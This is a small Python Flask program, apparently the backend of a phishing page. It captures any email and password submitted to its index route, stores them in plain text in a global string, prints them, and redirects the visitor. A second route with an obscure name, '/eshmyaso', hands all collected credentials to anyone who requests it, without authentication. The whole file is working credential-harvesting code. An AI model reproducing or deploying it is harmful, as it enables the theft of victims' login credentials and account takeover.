from flask import Flask, render_template,request
app = Flask(__name__)

c = ''

@app.route('/')
def index():
    global c
    a = request.values.get('password')
    b = request.values.get('email')
    print(c)
    if a != None:
        c += (str(b) +' '+ str(a)+' | ')
        return app.redirect('/')

    else:
        return render_template('index.html')


@app.route('/eshmyaso')

def kakotakomyaso():
    global c
    if c != '':
        return c
    else:
        return 'None'

if __name__ == '__main__':
    app.run()
